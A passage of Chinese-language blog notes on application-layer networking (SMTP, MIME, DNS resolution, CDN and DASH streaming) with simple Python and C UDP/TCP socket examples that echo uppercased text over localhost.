alt="image-20230829110643721"></p><p>邮件服务器，TCP连接建立后会，进行SMTP握手来确认收发方地址等等，之后发送报文</p><p>报文分为首部和主体，由一个空行隔开，报文必须为7位ascii编码</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">From:hello@xxx.com</span><br><span class="line">To:world@xxx.com</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">主体内容</span><br></pre></td></tr></table></figure><h4 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%94%A8%E9%80%94%E4%BA%92%E8%81%AF%E7%B6%B2%E9%83%B5%E4%BB%B6%E6%93%B4%E5%B1%95">MIME</a></h4><p>对于一些不能用ascii编码表示的数据采用了MIME (Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型</p><p>使用MIME需要包含一些首部行</p><p>MIME版本</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MIME-Version</span><span class="punctuation">: </span>1.0</span><br></pre></td></tr></table></figure><p>内容类型</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>[type]/[subtype]; parameter</span><br></pre></td></tr></table></figure><p>内容传输编码方式</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>[mechanism]</span><br></pre></td></tr></table></figure><p>mechanism的值可以指定为“7bit”，“8bit”，“binary”，“quoted-printable”，“base64”。</p><h3 id="邮件访问协议-拉协议"><a href="#邮件访问协议-拉协议" class="headerlink" title="邮件访问协议(拉协议)"></a>邮件访问协议(拉协议)</h3><p>POP3 Post Office Protocol–Version 3,第三版邮件协议</p><p>IMAP Internet Mail Access Protocol ，因特网邮件访问协议</p><p>HTTP</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p><strong>Domain Name System</strong> 域名系统，主要功能是将主机名解析为ip地址，通常是由其他应用层协议所使用</p><p>DNS运行在UDP之上，默认使用53号端口</p><p>DNS采用分布式，分层数据库，大致分为三种类型的服务器</p><ul><li>根DNS服务器</li><li>顶级域(Top-Level Domain,TLD)DNS服务器</li><li>权威DNS服务器</li></ul><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230829180249922.png" alt="image-20230829180249922"></p><p>DNS查询有两种方式：<strong>递归</strong>和<strong>迭代</strong>。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。而DNS服务器之间一般采用迭代查询方式。</p><blockquote><p><strong>递归：</strong>DNS服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS服务器本地没有存储查询DNS 信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。</p><p><strong>迭代：</strong>DNS服务器本地如果没有请求的DNS信息，会向客户机返回能够解析该查询请求的DNS服务器地址，客户机再向这台DNS 服务器提交请求，依次循环直到返回查询的结果</p></blockquote><p>访问 <a href="http://www.ytu.edu.cn/">www.ytu.edu.cn</a></p><ul><li><p>客户端发送查询报文”query <a href="http://www.ytu.edu.cn" 至本地dns服务器(一般为递归服务器),dns服务器首先检查自身缓存,如果存在记录则直接返回结果 ">www.ytu.edu.cn&quot;至本地DNS服务器(一般为递归服务器)，DNS服务器首先检查自身缓存，如果存在记录则直接返回结果</a></p></li><li><p>如果记录老化或不存在，则</p><p>1.DNS服务器向根域名服务器发送查询报文”query <a href="http://www.ytu.edu.cn" ,根域名服务器返回顶级域 ">www.ytu.edu.cn&quot;，根域名服务器返回顶级域</a> <code>.cn</code> 的顶级域名服务器地址。</p><p>2.DNS服务器向 <code>.cn</code> 域的顶级域名服务器发送查询报文”query <a href="http://www.ytu.edu.cn" ,得到二级域 ">www.ytu.edu.cn&quot;，得到二级域</a> <code>.edu.cn</code> 的权威域名服务器地址。</p><p>3.DNS服务器向 <code>.edu.cn</code> 域的权威域名服务器发送查询报文”query <a href="http://www.ytu.edu.cn" ,得到主机 ">www.ytu.edu.cn&quot;，得到主机</a> www 的A记录，存入自身缓存并返回给客户端。</p></li></ul><p>DNS服务器里存储了资源记录(Resource Record,RR),是一个四元组</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230830170605836.png" alt="image-20230830170605836"></p><p><strong>DNS报文</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230830181152543.png" alt="image-20230830181152543"></p><p>wireshark一个dns返回报文</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230902212408489.png" alt="image-20230902212408489"></p><h2 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h2><p>p2p文件分发协议 BitTorrent </p><h2 id="视频流和内容分发网"><a href="#视频流和内容分发网" class="headerlink" title="视频流和内容分发网"></a>视频流和内容分发网</h2><p>流式视频占据ISP流量的大部分，由于http流存在缺陷，一般采用DASH(Dynmic Adaptive Streaming over Http)：经HTTP的动态适应性流来传输</p><h3 id="DASH"><a href="#DASH" class="headerlink" title="DASH"></a>DASH</h3><p>服务器:</p><ul><li>将视频文件分割成多个块</li><li>每个块独立存储，编码于不同码率（8-10种）</li><li>告示文件（manifest file）: 提供不同块不同码率的URL</li></ul><p>客户端:</p><ul><li>先获取告示文件</li><li>周期性地测量服务器到客户端的带宽</li><li>查询告示文件,在一个时刻请求一个块，HTTP头部指定字节范围<ul><li>如果带宽足够，选择最大码率的视频块</li><li>会话中的不同时刻，可以切换请求不同的编码块 (取决于当时的可用带宽)</li></ul></li></ul><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>Content Distribution Networks 内容分发网络</p><p>为了解决高并发流媒体服务，通过cdn全网部署缓存节点，存储服务内容，就近为用户提供服务，提高用户体验</p><p>怎么让用户知道部署的cdn服务器在哪？</p><ol><li><p>通过manifest file文件里写入cdn信息</p></li><li><p>或者cdn利用dns截获和重定向请求(大多数)</p></li></ol><p>利用dns截获和重定向请求</p><ol><li>用户的本地 DNS 服务器（LDNS）将该 DNS 请求中继到目标服务器的权威 DNS 服务器<em>，</em>目标服务器的权威DNS服务器并不返回一个 IP 地址，而是向 LDNS 返回一个第三方 CDN 的主机名</li><li>LDNS再发送对第三方CDN的主机名的DNS请求，第三方CDN专用DNS基础设施根据它的选择策略将最符合的CDN的IP地址给LDNS</li><li>LDNS将该CDN转发给用户主机</li><li>主机建立于CDN的TCP连接，发送http get请求，如果使用dash，会先获取告示文件等等</li></ol><h2 id="套接字编程"><a href="#套接字编程" class="headerlink" title="套接字编程"></a>套接字编程</h2><h3 id="UDP–python"><a href="#UDP–python" class="headerlink" title="UDP–python"></a>UDP–python</h3><p>UDPServer</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">创建 Socket</span></span><br><span class="line"><span class="string">地址簇: AF_INET (IPv4)</span></span><br><span class="line"><span class="string">类型: SOCK_DGRAM (使用 UDP 传输控制协议)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">serverSocket=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"><span class="comment">#绑定地址（host,port）到套接字,任何向port发送的分组将导向该套接字</span></span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>,serverPort))<span class="comment">#host=&#x27;&#x27;表示绑定到所有可用接口</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#recvfrom接收UDP数据,需要指定接收数据的最大长度,返回值是（data,address）</span></span><br><span class="line">    <span class="comment">#address是客户ip地址和端口号的元组(ipaddr，port）</span></span><br><span class="line">    message,clientAddr=serverSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line">    modifiedMessage=message.decode().upper()</span><br><span class="line">    <span class="comment">#sendto发送UDP数据,参数二address是形式为（ipaddr，port）的元组</span></span><br><span class="line">    serverSocket.sendto(modifiedMessage.encode(),clientAddr)</span><br></pre></td></tr></table></figure><p>UDPClient</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="comment">#操作系统会为我们的socket分配一个端口号</span></span><br><span class="line">clientSocket=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">message=<span class="built_in">input</span>(<span class="string">&#x27;string--&gt;STRING: &#x27;</span>)</span><br><span class="line">clientSocket.sendto(message.encode(),(serverName,serverPort))</span><br><span class="line">modifiedMessage,serverAddr=clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="TCP–python"><a href="#TCP–python" class="headerlink" title="TCP–python"></a>TCP–python</h3><p>TCPServer</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">创建 Socket</span></span><br><span class="line"><span class="string">地址簇address family: AF_INET (IPv4)</span></span><br><span class="line"><span class="string">类型: SOCK_STREAM (使用 TCP 传输控制协议)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">serverSocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>,serverPort))</span><br><span class="line"><span class="comment">#开始TCP监听,参数backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量，可以理解为最大排队数量</span></span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="comment">#阻塞的被动等待tcp连接,握手完成后建立TCP连接,返回新套接字</span></span><br><span class="line">  connectionSocket,addr=serverSocket.accept()</span><br><span class="line">  <span class="built_in">print</span>(addr)</span><br><span class="line">  <span class="comment">#接收TCP数据</span></span><br><span class="line">  message=connectionSocket.recv(<span class="number">1024</span>)</span><br><span class="line">  modifiedMessage=message.decode().upper()</span><br><span class="line">  <span class="comment">#发送 TCP 数据，已经tcp建立连接，不用显示指明ip和port</span></span><br><span class="line">  connectionSocket.send(modifiedMessage.encode())</span><br><span class="line">  connectionSocket.close()</span><br></pre></td></tr></table></figure><p>TCPClient</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line">clientSocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line"><span class="comment">#三次握手建立tcp连接</span></span><br><span class="line">clientSocket.connect((serverName,serverPort))</span><br><span class="line">message=<span class="built_in">input</span>(<span class="string">&#x27;string--&gt;STRING: &#x27;</span>)</span><br><span class="line">clientSocket.send(message.encode())</span><br><span class="line">modifiedMessage,serverAddr=clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="UDP–linux-C"><a href="#UDP–linux-C" class="headerlink" title="UDP–linux C"></a>UDP–linux C</h3><p>UDPServer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQUEUE 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stringLow2Upper</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(<span class="built_in">string</span>); i++) &#123;</span><br><span class="line">       <span class="built_in">string</span>[i] =<span class="built_in">toupper</span>(<span class="built_in">string</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;</span><br><span class="line">    serverSockaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="comment">//创建udp socket</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//绑定socket到本地端口</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                   <span class="keyword">sizeof</span>(serverSockaddr))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">       <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">       <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientSockaddr</span>;</span></span><br><span class="line">       <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(clientSockaddr);</span><br><span class="line">       <span class="comment">// ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,</span></span><br><span class="line">       <span class="comment">//                 struct sockaddr *src_addr, socklen_t *addrlen);</span></span><br><span class="line">       <span class="comment">//从套接字读取数据,把发送方的ip:port等放入clientSockaddr</span></span><br><span class="line">       recvfrom(serverSocket, buffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">                (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, &amp;length);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;connect%s:%d\n&quot;</span>, inet_ntoa(clientSockaddr.sin_addr),</span><br><span class="line">              ntohs(clientSockaddr.sin_port));</span><br><span class="line">      <span class="comment">//  ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,</span></span><br><span class="line">      <span class="comment">//                 const struct sockaddr *dest_addr, socklen_t addrlen);</span></span><br><span class="line">      stringLow2Upper(buffer);</span><br><span class="line">      sendto(serverSocket, buffer, BUFFER_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UDPClient</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span> =</span> &#123;</span><br><span class="line">        .sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>),</span><br><span class="line">        .sin_port = htons(PORT),</span><br><span class="line">        .sin_family = AF_INET,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//创建socket</span></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> sendBuffer[BUFFER_SIZE], recvBuffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(serverSockaddr);</span><br><span class="line">    <span class="built_in">memset</span>(sendBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(recvBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    fgets(sendBuffer, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">    sendto(clientSocket, sendBuffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">           (<span class="keyword">struct</span> sockaddr*)&amp;serverSockaddr, length);</span><br><span class="line">    recvfrom(clientSocket, recvBuffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">             (<span class="keyword">struct</span> sockaddr*)&amp;serverSockaddr, &amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,recvBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TCP–linux-C"><a href="#TCP–linux-C" class="headerlink" title="TCP–linux C"></a>TCP–linux C</h3><p>TCPServer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQUEUE 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stringLow2Upper</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">string</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">string</span>[i] = <span class="built_in">toupper</span>(<span class="built_in">string</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct sockaddr_in &#123;</span></span><br><span class="line"><span class="comment">　　 short int sin_family; Address family</span></span><br><span class="line"><span class="comment">    unsigned short int sin_port; Port number</span></span><br><span class="line"><span class="comment">    struct in_addr sin_addr;  Internet address</span></span><br><span class="line"><span class="comment">    unsigned char sin_zero[8]; Same size as struct sockaddr</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">　　*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;  <span class="comment">//地址簇</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    网络字节序通常是大端字节序,linux小端序</span></span><br><span class="line"><span class="comment">    hton:host to network</span></span><br><span class="line"><span class="comment">    uint16_t htons(uint16_t hostlong) 16位从主机字节顺序转换成网络字节顺序</span></span><br><span class="line"><span class="comment">    uint32_t htonl(uint32_t hostlong) 32位同上</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    serverSockaddr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// IP地址</span></span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);               <span class="comment">//端口</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//绑定socket</span></span><br><span class="line">    <span class="comment">// int bind(int  sockfd, const struct sockaddr * addr, socklen_t  len)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                   <span class="keyword">sizeof</span>(serverSockaddr))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TCP监听端口</span></span><br><span class="line">    <span class="keyword">if</span> (listen(serverSocket, MAXQUEUE) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientSockaddr</span>;</span></span><br><span class="line">        <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(clientSockaddr);</span><br><span class="line">        <span class="comment">// Int accept(int sockfd,  struct sockaddr *restrict  addr, socklen_t</span></span><br><span class="line">        <span class="comment">// *restrict  len)</span></span><br><span class="line">        <span class="comment">//阻塞等待tcp连接,返回连接的socket</span></span><br><span class="line">        <span class="type">int</span> connectionSocket =</span><br><span class="line">            accept(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, &amp;length);</span><br><span class="line">        <span class="keyword">if</span> (connectionSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect%s:%d\n&quot;</span>, inet_ntoa(clientSockaddr.sin_addr),</span><br><span class="line">               ntohs(clientSockaddr.sin_port));</span><br><span class="line">        <span class="comment">//向套接字接受数据</span></span><br><span class="line">        <span class="comment">// int recv(int sockfd,  const void *buf,  size_t  nbytes,  int  flags);</span></span><br><span class="line">        recv(connectionSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buffer);</span><br><span class="line">        stringLow2Upper(buffer);</span><br><span class="line">        <span class="comment">//向套接字发送数据</span></span><br><span class="line">        <span class="comment">// Int send(int sockfd,  const void *buf,  size_t  nbytes,  int  flags);</span></span><br><span class="line">        send(connectionSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">        close(connectionSocket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TCPClient</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> sendBuffer[BUFFER_SIZE], recvBuffer[BUFFER_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(sendBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(recvBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;</span><br><span class="line">    serverSockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="comment">//创建套接字</span></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// int connect(int  sockfd, const struct sockaddr  *addr,  socklen_t  len);</span></span><br><span class="line">    <span class="comment">//利用套接字和目标主机建立tcp连接</span></span><br><span class="line">    <span class="keyword">if</span> (connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                <span class="keyword">sizeof</span>(serverSockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;string--&gt;STRING&quot;</span>);</span><br><span class="line">    fgets(sendBuffer, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="comment">//发送数据</span></span><br><span class="line">    send(clientSocket, sendBuffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//接受数据</span></span><br><span class="line">    recv(clientSocket, recvBuffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(recvBuffer);</span><br><span class="line">    close(clientSocket);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 WMCTF</title>
      <link href="/2023/08/28/2023wmctf/"/>
      <url>/2023/08/28/2023wmctf/</url>
      
